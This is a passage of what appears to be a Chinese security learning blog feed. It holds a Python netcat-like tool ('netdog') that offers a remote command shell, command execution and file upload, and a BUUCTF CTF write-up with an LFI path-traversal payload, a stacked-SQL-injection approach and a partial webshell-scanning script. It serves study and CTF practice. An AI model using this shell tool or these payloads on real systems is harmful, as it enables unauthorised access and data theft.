coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading  <span class="comment"># 用于多线程处理</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置要监听的ip和端口</span></span><br><span class="line">bind_ip = <span class="string">"0.0.0.0"</span></span><br><span class="line">bind_port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建socket对象</span></span><br><span class="line">server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定ip和端口</span></span><br><span class="line">server.bind((bind_ip, bind_port))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始监听并设置最大连接数</span></span><br><span class="line">server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Listening on %s:%d"</span> % (bind_ip, bind_port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户连接处理线程</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_client</span><span class="params">(client_socket)</span>:</span></span><br><span class="line"></span><br><span class="line">    request = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Received: %s"</span> % request</span><br><span class="line"></span><br><span class="line">    client_socket.send(<span class="string">"ACK!"</span>)</span><br><span class="line"></span><br><span class="line">    client_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环监听，当有客户端连接就调用 handler_client()函数</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 接受客户端连接，返回(新套接字, 连接客户端地址)的一个元组</span></span><br><span class="line">    client, addr = server.accept()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Accepted connection from: %s:%d"</span> % (addr[<span class="number">0</span>], addr[<span class="number">1</span>])  <span class="comment"># addr[0]是ip, addr[1]是端口</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 挂起客户端线程，处理传入的数据</span></span><br><span class="line">    client_handler = threading.Thread(target=handle_client, args=(client, ))  <span class="comment"># target为需要调用的函数，args为函数对应的参数(元组)</span></span><br><span class="line">    client_handler.start()</span><br></pre></td></tr></table></figure><p>这个脚本主要用来监听端口并且接收连接，比如我们可以用刚刚的客户端给它发消息：</p><p><img src="https://i.loli.net/2019/07/23/5d3686460f7b766274.png" alt=""></p><h2 id="netdog"><a href="#netdog" class="headerlink" title="netdog"></a>netdog</h2><p>这个脚本使用python编写来代替netcat(大多数情况下没有nc但是有python的环境中)实现上传文件，获取shell，发送信息等等功能。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys         <span class="comment"># 调用系统函数</span></span><br><span class="line"><span class="keyword">import</span> socket      <span class="comment"># 建立TCP连接</span></span><br><span class="line"><span class="keyword">import</span> getopt      <span class="comment"># 获取命令行参数</span></span><br><span class="line"><span class="keyword">import</span> threading   <span class="comment"># 多线程</span></span><br><span class="line"><span class="keyword">import</span> subprocess  <span class="comment"># 处理命令，返回命令执行结果</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义全局变量</span></span><br><span class="line">target              = <span class="string">""</span></span><br><span class="line">port                = <span class="number">0</span></span><br><span class="line">listen              = <span class="literal">False</span></span><br><span class="line">execute             = <span class="string">""</span></span><br><span class="line">command             = <span class="literal">False</span></span><br><span class="line">upload              = <span class="literal">False</span></span><br><span class="line">upload_destination  = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 帮助信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"NetDog Tool"</span></span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Usage: netdog.py -t target_host -p port"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-l --listen              - listen on [host]:[port] for incoming connections"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-e --execute=file_to_run - execute the given file upon receiving a connection"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-c --command             - initialize a command shell"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-u --upload=destination  - upon receiving connection upload a file and write to [destination]"</span></span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Examples: "</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"netdog.py -t 192.168.0.1 -p 5555 -l -c"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"netdog.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"netdog.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"echo 'ABCDEFGHI' | ./netdog.py -t 192.168.11.12 -p 135"</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> port</span><br><span class="line">    <span class="keyword">global</span> listen</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line">    <span class="keyword">global</span> upload_destination</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(sys.argv[<span class="number">1</span>:]):</span><br><span class="line">        usage()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opts, args = getopt.getopt(sys.argv[<span class="number">1</span>:], <span class="string">"t:p:u:e:hlc"</span>, [<span class="string">"target"</span>, <span class="string">"port"</span>, <span class="string">"upload"</span>, <span class="string">"execute"</span>, <span class="string">"help"</span>, <span class="string">"listen, command"</span>])</span><br><span class="line">    <span class="keyword">except</span> getopt.GetoptError <span class="keyword">as</span> err:</span><br><span class="line">        <span class="keyword">print</span> str(err)</span><br><span class="line">        usage()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取命令行选项，根据选项给相应的全局变量变量初始化</span></span><br><span class="line">    <span class="keyword">for</span> option_name, option_value <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> option_name <span class="keyword">in</span> (<span class="string">"-h"</span>, <span class="string">"--help"</span>):</span><br><span class="line">            usage()</span><br><span class="line">        <span class="keyword">elif</span> option_name <span class="keyword">in</span> (<span class="string">"-l"</span>, <span class="string">"--listen"</span>):</span><br><span class="line">            listen = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> option_name <span class="keyword">in</span> (<span class="string">"-e"</span>, <span class="string">"--execute"</span>):</span><br><span class="line">            execute = option_value</span><br><span class="line">        <span class="keyword">elif</span> option_name <span class="keyword">in</span> (<span class="string">"-c"</span>, <span class="string">"--commandshell"</span>):</span><br><span class="line">            command = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> option_name <span class="keyword">in</span> (<span class="string">"-u"</span>, <span class="string">"--upload"</span>):</span><br><span class="line">            upload_destination = option_value</span><br><span class="line">        <span class="keyword">elif</span> option_name <span class="keyword">in</span> (<span class="string">"-t"</span>, <span class="string">"--target"</span>):</span><br><span class="line">            target = option_value</span><br><span class="line">        <span class="keyword">elif</span> option_name <span class="keyword">in</span> (<span class="string">"-p"</span>, <span class="string">"--port"</span>):</span><br><span class="line">            port = int(option_value)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">assert</span> <span class="literal">False</span>, <span class="string">"Unkonw Option"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 不处于监听模式时</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> listen <span class="keyword">and</span> len(target) <span class="keyword">and</span> port &gt; <span class="number">0</span>:</span><br><span class="line">        buffer_str = sys.stdin.read()</span><br><span class="line">        client_sender(buffer_str)</span><br><span class="line">    <span class="comment"># 处于监听模式时</span></span><br><span class="line">    <span class="keyword">if</span> listen:</span><br><span class="line">        server_loop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送消息，并将返回结果打印</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_sender</span><span class="params">(buffer_str)</span>:</span></span><br><span class="line">    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        client.connect((target, port))</span><br><span class="line">        <span class="keyword">if</span> len(buffer_str):</span><br><span class="line">            client.send(buffer_str)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            recv_len = <span class="number">1</span></span><br><span class="line">            response = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> recv_len:</span><br><span class="line">                data = client.recv(<span class="number">4096</span>)</span><br><span class="line">                recv_len = len(data)</span><br><span class="line">                response += data</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> recv_len &lt; <span class="number">4096</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> response,</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 继续获取输入，为了与命令行匹配加上换行符</span></span><br><span class="line">            buffer_str = raw_input(<span class="string">""</span>)</span><br><span class="line">            buffer_str += <span class="string">"\n"</span></span><br><span class="line"></span><br><span class="line">            client.send(buffer_str)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[*] Exception! Exiting."</span></span><br><span class="line">        client.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置监听循环</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_loop</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果没有指定ip，默认为监听本机ip</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(target):</span><br><span class="line">        target = <span class="string">"0.0.0.0"</span></span><br><span class="line"></span><br><span class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server.bind((target, port))</span><br><span class="line"></span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 当有客户端连接时，挂起一个线程，执行client_handler((client_socket))函数</span></span><br><span class="line">        client_socket, addr = server.accept()</span><br><span class="line">        client_thread = threading.Thread(target=client_handler, args=(client_socket,))</span><br><span class="line">        client_thread.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行从客户端获取的命令，返回执行结果</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_command</span><span class="params">(command)</span>:</span></span><br><span class="line">    command = command.rstrip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        output = <span class="string">"Failed to execute command.\r\n"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当有客户端连接之后，根据命令行选项执行不同的功能</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_handler</span><span class="params">(client_socket)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> upload</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 上传文件至指定路径</span></span><br><span class="line">    <span class="keyword">if</span> len(upload_destination):</span><br><span class="line">        file_buffer = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file_buffer += data</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file_descriptor = open(upload_destination, <span class="string">"wb"</span>)</span><br><span class="line">            file_descriptor.write(file_buffer)</span><br><span class="line">            file_descriptor.close()</span><br><span class="line"></span><br><span class="line">            client_socket.send(<span class="string">"Successfully saved file to %s\r\n"</span> % upload_destination)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            client_socket.send(<span class="string">"Failed to save file to %s\r\n"</span> % upload_destination)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 执行命令，返回结果</span></span><br><span class="line">    <span class="keyword">if</span> len(execute):</span><br><span class="line">        output = run_command(execute)</span><br><span class="line">        client_socket.send(output)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 返回一个shell</span></span><br><span class="line">    <span class="keyword">if</span> command:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client_socket.send(<span class="string">"&lt;netdog:#&gt; "</span>)</span><br><span class="line"></span><br><span class="line">            cmd_buffer = <span class="string">""</span></span><br><span class="line">            <span class="keyword">while</span> <span class="string">"\n"</span> <span class="keyword">not</span> <span class="keyword">in</span> cmd_buffer:</span><br><span class="line">                cmd_buffer += client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">            response = run_command(cmd_buffer)</span><br><span class="line">            client_socket.send(response)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><strong>执行演示：</strong></p><h3 id="开始界面"><a href="#开始界面" class="headerlink" title="开始界面"></a>开始界面</h3><p><img src="https://i.loli.net/2019/07/23/5d368cd668ebe65612.png" alt=""></p><h3 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h3><p><img src="https://i.loli.net/2019/07/23/5d368d2b9ea8439905.png" alt=""></p><p><strong>注意：未指定<code>-t target</code>默认是监听本机，另外连接时，输入完命令需要手动<code>CTRL+D</code>输入语句结束符，才能连接到shell</strong></p><h3 id="发送HTTP请求"><a href="#发送HTTP请求" class="headerlink" title="发送HTTP请求"></a>发送HTTP请求</h3><p>下面我们试试用<code>netdog</code>发送HTTP请求，获取<code>www.baidu.com</code>的响应：</p><p><img src="https://i.loli.net/2019/07/23/5d368f10e91a961389.png" alt=""></p><p><strong><em>成功~</em></strong></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>《<em>Black hat Python: Python Programming for Hackers and Pentesters</em>》<strong>P1~P21</strong></p><p><strong>PS：netdog是随便取的，仅用于学习时方便记忆，侵删！</strong></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>刚开始学习，只学了点皮毛，继续加油吧 = =</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近在学习python网络脚本编写，利用tcp客户端/服务器学习编写了一个代替netcat(简陋)的工具，记录一下。&lt;/p&gt;
&lt;h2 id=
      
    
    </summary>
    
    
    
      <category term="Web" scheme="https://www.sketchplane.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF 刷题记录</title>
    <link href="https://www.sketchplane.top/2019/07/18/BUUCTF-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://www.sketchplane.top/2019/07/18/BUUCTF-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2019-07-18T12:41:44.000Z</published>
    <updated>2019-10-28T10:41:59.883Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>练习平台：<a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">BUUCTF</a></p><p>web部分会一直更，争取做一只合格的web狗 XD</p><h2 id="0x00-HCTF-2018-WarmUp"><a href="#0x00-HCTF-2018-WarmUp" class="headerlink" title="0x00 [HCTF 2018]WarmUp"></a>0x00 [HCTF 2018]WarmUp</h2><p>*<em>考察点：phpmyadmin CVE-2018-12613 *</em></p><p>直接看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里如果是研究过<code>phpmyadmin</code>的<code>CVE-2018-12613</code>，那么应该很熟悉hhh。</p><p>一个<code>LFI</code>，直接构造<code>payload</code>打一发，得到<code>flag</code>。</p><p><code>payload：?file=source.php%253f/../../../../../../../ffffllllaaaagggg</code></p><h2 id="0x01-QWB-2019-随便注"><a href="#0x01-QWB-2019-随便注" class="headerlink" title="0x01 [QWB 2019]随便注"></a>0x01 [QWB 2019]随便注</h2><p><strong>考察点：堆叠注入</strong></p><p><img src="https://i.loli.net/2019/07/18/5d307d9963d8146137.png" alt="安全与开发缺一不可"></p><p>测试的时候可以发现有严格的过滤，于是考虑堆叠注入。</p><p>知道是堆叠注入之后可以一路爆数据库名，表名，列名：<code>flag in ctftraining --&gt; FLAG_TABLE --&gt; FLAG_COLUMN</code></p><p>关键是过滤了<code>select</code>，要如何读取字段的值呢？</p><p>注意我们一开始就有默认查询的<code>words</code>表，既然没有过滤<code>alert</code>和<code>rename</code>，那我们是不是可以给表和列都改个名字，让程序默认查询<code>FLAG_TABLE</code>里的<code>FLAG_COLUMN</code>呢。</p><p>思路大概就是这样，今天又试了一下，不知道为啥把题目改挂了= =，等docker重置了再说吧。</p><h2 id="0x02-QWB-2019-高明的黑客"><a href="#0x02-QWB-2019-高明的黑客" class="headerlink" title="0x02 [QWB 2019]高明的黑客"></a>0x02 [QWB 2019]高明的黑客</h2><p><strong>考察点：脚本批量搜索</strong></p><p>也是QWB的题目，我们的目标就是找到一个webshell，然后读flag。</p><p>由于<code>wtcl</code>，这里先用<strong>@glzjin</strong>师傅的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 批量扫描测试$_GET和$_POST 找到含有有效传参点的文件</span></span><br><span class="line"><span class="comment"># 要开web服务</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> concurrent.futures.thread <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">path = <span class="string">"/Users/jinzhao/PhpstormProjects/qwb/web2/"</span>  <span class="comment"># 文件夹目录</span></span><br><span class="line">files = os.listdir(path)  <span class="comment"># 得到文件夹下的所有文件名称</span></span><br><span 